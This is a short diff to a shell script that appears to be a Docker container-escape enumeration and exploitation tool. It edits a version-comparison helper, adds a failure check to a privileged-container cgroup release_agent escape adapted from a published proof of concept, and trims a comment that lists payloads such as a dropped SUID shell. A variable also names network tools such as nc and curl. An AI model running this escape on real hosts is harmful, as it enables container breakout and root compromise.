@@ -129,10 +129,10 @@ USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python p
 #---------------) Helpers (---------------#
 ###########################################
 
-# Convert version numbers into a regular number so we can do simple comparisons.
+# Convert version numbers into a regular number so we can do simple comparisons (use floats because sh can interpret 0 prefix numbers incorrectly otherwise).
 # shellcheck disable=SC2046
 # shellcheck disable=SC2183 # word splitting here is on purpose
-ver() { printf "%03d%03d%03d" $(echo "$1" | tr '.' ' '); }
+ver() { printf "%03.0f%03.0f%03.0f" $(echo "$1" | tr '.' ' '); }
 
 ###########################################
 #--------------) Printing (---------------#
@@ -962,6 +962,10 @@ exploitPrivileged() {
   # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
   # shellcheck disable=SC2012 # Not using find as it may not be available
   d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
+  if [ -S "$d" ]; then
+    printError "Error: exploit failed (docker too old?)"
+    return
+  fi
   mkdir -p "$d/w"
   echo 1 >"$d/w/notify_on_release"
   t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
@@ -1226,11 +1230,6 @@ exit 0
 #
 # PAYLOADS
 # - drop suid shell
-#
-# CHECKS
-#
-# Am I root
-# Am I sudo
 #
 # EXPLOITS
 #
